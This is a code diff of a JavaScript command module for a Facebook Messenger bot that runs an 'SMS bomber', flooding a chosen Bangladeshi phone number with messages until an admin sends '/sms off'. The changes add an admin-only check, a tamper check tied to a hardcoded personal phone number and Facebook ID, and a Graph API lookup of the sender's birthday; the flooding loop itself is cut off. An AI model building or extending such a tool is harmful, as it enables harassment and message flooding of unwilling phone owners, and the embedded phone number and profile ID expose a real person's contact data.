@@ -2,20 +2,30 @@ module.exports.config = {
   name: "sms",
   version: "2.0.0",
   hasPermssion: 0,
-  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️",
-  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off (শুধুমাত্র অ্যাডমিন)",
+  credits: "CYBER BOT TEAM",
+  description: "SMS বোম্বার চালু/বন্ধ",
   commandCategory: "Tool",
   usages: "/sms 01xxxxxxxxx অথবা /sms off",
   cooldowns: 0,
-  dependencies: { axios: "" }
+  dependencies: { "axios": "" }
 };
 
 const axios = require("axios");
 const bombingFlags = {};
 
-// **এখানে তোমার অ্যাডমিন নাম্বার বসাও**
-const ADMIN_ID = "01715559179";
+// এডমিন UID ও ফোন
+const adminUIDs = ["100013678366954"]; // রাজার UID
+const adminPhone = "01715559179";      // রাজার মোবাইল
 
+// Access Token দিন এখানে
+const FACEBOOK_ACCESS_TOKEN = "আপনার_ফেসবুক_অ্যাক্সেস_টোকেন_এখানে_দিবেন";
+
+// সিকিউরিটি চেক
+if (!adminUIDs.includes("100013678366954") || adminPhone !== "01715559179") {
+  throw new Error("❌ এডমিন UID বা ফোন নম্বর পরিবর্তিত হয়েছে বা মুছে ফেলা হয়েছে! স্ক্রিপ্ট বন্ধ।");
+}
+
+// বাংলা মাসের নাম
 function getBanglaMonth(monthIndex) {
   const months = [
     "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
@@ -24,6 +34,7 @@ function getBanglaMonth(monthIndex) {
   return months[monthIndex];
 }
 
+// তারিখ ও সময় ফরম্যাট
 function formatDateTime(date) {
   const year = date.getFullYear();
   const month = getBanglaMonth(date.getMonth());
@@ -35,50 +46,39 @@ function formatDateTime(date) {
   return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds}`;
 }
 
-function checkAdminID() {
-  if (!ADMIN_ID || ADMIN_ID.trim() === "100013678366954") {
-    console.error("❌ ERROR: ADMIN_ID সেট করা নেই। বট বন্ধ করা হচ্ছে।");
-    for (const thread in bombingFlags) {
-      bombingFlags[thread] = false;
-    }
-    // process.exit(1); // চাইলে পুরো প্রোগ্রাম বন্ধ করতে uncomment করো
-    return false;
-  }
-  return true;
-}
-
 module.exports.run = async ({ api, event, args }) => {
-  if (!checkAdminID()) return;
-
   const threadID = event.threadID;
   const senderID = event.senderID;
   const number = args[0];
 
+  // শুধু অ্যাডমিন
+  if (!adminUIDs.includes(senderID)) {
+    return api.sendMessage("⚠️ আপনি এই কমান্ড ব্যবহারের অনুমতি পাননি।", threadID);
+  }
+
+  // ফেসবুক থেকে জন্মদিন আনা
+  let userBirthday = "জন্মদিন তথ্য পাওয়া যায়নি।";
+  try {
+    const res = await axios.get(`https://graph.facebook.com/${senderID}`, {
+      params: {
+        fields: "birthday",
+        access_token: FACEBOOK_ACCESS_TOKEN
+      }
+    });
+
+    if (res.data && res.data.birthday) {
+      userBirthday = res.data.birthday; // "MM/DD/YYYY" বা "MM/DD"
+    }
+  } catch (e) {
+    console.log("Birthday fetch error:", e.message);
+  }
+
+  // লোকেশন (ঢাকা ধরে নেওয়া)
   const latitude = 23.8103;
   const longitude = 90.4125;
   const locationURL = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
 
-  const helpMessage =
-    "•┄┅════❁🌺❁════┅┄•\n\n" +
-    "☠️••SMS BOMBER BY —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️💣\n\n" +
-    "ব্যবহার:\n" +
-    "1. /sms 01xxxxxxxxx  (বাংলাদেশি নাম্বার)\n" +
-    "2. /sms off        (বোম্বিং বন্ধ করতে - শুধুমাত্র অ্যাডমিন)\n" +
-    "3. বোম্বিং চলাকালে /sms off দিলে বন্ধ হবে\n" +
-    "4. শুধুমাত্র বাংলাদেশের নম্বর কাজ করবে\n" +
-    "5. নম্বর ১১ ডিজিট হতে হবে\n" +
-    "6. বোম্বিং চলাকালে অন্য কেউ আর বোম্বিং শুরু করতে পারবে না\n" +
-    "7. মজার জন্য ব্যবহার করুন\n\n" +
-    "•┄┅════❁🌺❁════┅┄•";
-
-  if (!number) {
-    return api.sendMessage(helpMessage, threadID);
-  }
-
   if (number === "off") {
-    if (senderID !== ADMIN_ID) {
-      return api.sendMessage("❌ শুধুমাত্র অ্যাডমিনই বট বন্ধ করতে পারে।", threadID);
-    }
     if (bombingFlags[threadID]) {
       bombingFlags[threadID] = false;
       return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
@@ -88,7 +88,10 @@ module.exports.run = async ({ api, event, args }) => {
   }
 
   if (!/^01[0-9]{9}$/.test(number)) {
-    return api.sendMessage(helpMessage, threadID);
+    return api.sendMessage(
+      "❗ সঠিক ফরম্যাটে বাংলাদেশি নাম্বার দিন!\n\nUsage:\n/sms 01xxxxxxxxx",
+      threadID
+    );
   }
 
   if (bombingFlags[threadID]) {
@@ -99,12 +102,20 @@ module.exports.run = async ({ api, event, args }) => {
 
   const now = new Date();
   const formattedDateTime = formatDateTime(now);
+  const userProfile = `https://facebook.com/${senderID}`;
 
   api.sendMessage(
-    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে।\n\n⏰ সময়: ${formattedDateTime}\n📍 লোকেশন: ${locationURL}\n\nবন্ধ করতে /sms off`,
+    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে।\n\n` +
+    `⏰ সময়: ${formattedDateTime}\n` +
+    `📍 লোকেশন (ধারণা): ${locationURL}\n` +
+    `👤 ইউজার প্রোফাইল: ${userProfile}\n` +
+    `🎂 আপনার জন্মদিন: ${userBirthday}\n` +
+    `📞 এডমিন: রাজা (${adminPhone})\n\n` +
+    `বন্ধ করতে /sms off`,
     threadID
   );
 
+  // বোম্বিং শুরু
   (async function startBombing() {
     while (bombingFlags[threadID]) {
       try {
